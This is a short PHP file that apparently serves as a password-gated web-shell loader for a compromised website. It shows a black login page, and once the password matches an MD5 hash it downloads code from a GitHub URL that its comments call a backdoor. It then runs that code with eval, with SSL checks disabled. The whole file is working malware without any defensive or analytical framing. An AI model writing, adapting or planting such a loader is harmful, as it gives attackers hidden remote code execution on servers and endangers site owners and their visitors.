<?php
session_start();

function fetch_url($url) {
    if (function_exists('curl_exec')) {
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION["SAP"])) {
            curl_setopt($ch, CURLOPT_COOKIE, $_SESSION["SAP"]);
        }
        $response = curl_exec($ch);
        curl_close($ch);
        return $response;
    } elseif (function_exists('file_get_contents')) {
        return file_get_contents($url);
    } elseif (function_exists('fopen') && function_exists('stream_get_contents')) {
        $handle = fopen($url, 'r');
        $response = stream_get_contents($handle);
        fclose($handle);
        return $response;
    }
    return false;
}

function is_logged_in() {
    return isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true;
}

// Set cookie default
$_SESSION["SAP"] = "janco";

if (!isset($_POST["password"])) {
    // Tampilkan form login
    echo '<!DOCTYPE html>
    <html>
    <head>
        <title>Seo Ane Puasi</title>
    </head>
    <body>
        <center>
            <img src="https://i.ibb.co/dfscZXp/ane-puasi.png" />
            <body style="background-color:black;">
                <form method="POST" action="">
                    <label for="password">Password:</label>
                    <input type="password" id="password" name="password">
                    <input type="submit" value="Touch Me!">
                </form>
        </center>
    </body>
    </html>';
    exit;
}

$password_input = $_POST["password"];
$correct_hash = "dc2f4ef676263fe9dde73a9ae6299258"; // MD5 dari password

if (md5($password_input) === $correct_hash) {
    $_SESSION["logged_in"] = true;
    $_SESSION["SAP"] = "janco";
    
    // Ambil dan jalankan file backdoor dari GitHub
    $remote_code = fetch_url("https://raw.githubusercontent.com/ItsMeAlf404/Backdoor/main/awok.php");
    eval("?" . ">" . $remote_code);
} else {
    echo "Incorrect password. Please try again.";
    exit;
}
?>